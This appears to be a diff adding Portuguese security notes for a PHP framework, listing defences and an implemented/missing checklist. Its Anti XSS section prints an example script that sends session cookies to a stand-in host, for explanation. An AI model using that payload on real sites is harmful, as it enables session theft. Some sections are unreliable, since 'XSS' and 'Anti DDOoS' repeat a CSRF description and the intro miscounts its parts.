@@ -1,0 +1,162 @@
+SEGURANÇA NO JF FRAMEWORK
+=========================
+        
+
+Introdução
+----------
+
+    Essa sessão está distribuída em 3 partes:
+
+        1. Segurança automatizada pelo JF Framework
+        2. Segurança implementada pelo JF Framework
+
+
+Anti Command
+-------------
+
+    Não execute comandos no servidor a partir de  parâmetros enviados pelo cliente.
+
+
+SQL Injection
+-------------
+
+    Model::* e SQL::*
+
+
+Remote Code Injection
+---------------------
+
+    Não faça include de arquivos a partir de parâmetros enviados pelo cliente.
+
+
+Anti Spoofing
+-------------
+
+    Form::tokenize()
+    <?= $this->token ?>
+    Form::validate()
+
+
+Validação de dados externos
+---------------------------
+
+    Types::validate();
+
+
+Anti Hijacling (roubo de sessões)
+---------------------------------
+
+    session_name()          usa headers
+
+
+Anti Session Fixation (acesso por sessão fixa)
+----------------------------------------------
+
+    session_regenerate_id()
+
+
+Anti XSS (Cross-Site Scripting)
+-------------------------------
+
+    Consiste em injetar uma tag script em um comentário de um POST,
+    de forma a enviar o cookie da sessão para o site do atacante:
+        <script>
+            var href = 'http://exemplo.org/getcookies.php?cookies=' +
+                document.cookie;
+            document.location = href;
+        </script>
+
+    Para evitar obter a sessão via javascript, `session.cookie_httponly = true`.
+    
+    Utilize `htmlentities` quando você não utilizar um framework ou biblioteca
+    javascript para converter o HTML em texto plano.
+
+
+Tempo de vida das sessões
+-------------------------
+
+    safety.sessions.expires
+
+Upload de imagens
+-----------------
+
+    Valida arquivos de Input::file() valida os arquivos de imagem
+
+
+Exposição do servidor
+---------------------
+
+    error_reporting
+    Permissão de pastas 
+    open_basedir        Limita as pastas que o PHP pode manipular
+    Utilize programas de inspeção
+
+
+Bancos-de-dados
+---------------
+
+    Salve as senhas criptografas no banco de dados.
+    Utilize a lei do menor privilégio
+
+
+Senhas
+------
+
+    Não permita tentativas de login com menos de 2 segundos
+    Utilize um captcha, pelo a partir da terceira tentativa de autenticação
+    Ajude o usuário a criar uma senha forte
+
+
+XSS
+---
+
+    O ataque consiste em forjar requisições de outros usuários legítimos.
+    `$_SESSION[ [DIR_BASE]_token_app ]`.
+
+
+Anti DDOoS
+----------
+
+    O ataque consiste em forjar requisições de outros usuários legítimos.
+    `$_SESSION[ [DIR_BASE]_token_app ]`.
+
+
+Backup
+------
+
+    Versionamento ou backup da aplicação.
+    Backup de banco-de-dados.
+
+
+
+    IMPLEMENTADO
+    Htaccess acesso arquivos
+    URL não acessa arquivos
+    URL não executa Shell
+    Senhas cript antes do banco
+    SQL injection x prepare
+    Http_only
+    Http_trans_id
+    Senha não cookies
+    Session_name
+    Xss com vue
+    validar dados no servidor
+    Senhas não arquivo
+    Http_user_agent
+    Senhas letras números e símbolos
+    Chave de nova aplicação sessões
+    Session_handler log não salva sess
+
+    FALTA
+    Display errors só dev
+    Testes
+    Http_refer + token forms
+    Session_regenerate_id
+    3 Tentativas login
+    Captcha
+    Permissoes pastas e arquivos
+    Registrar tentativas de login
+    Ssl
+    Bin2hex
+    Desabilitar erros em produção
+    Generalizar mensagens de erro
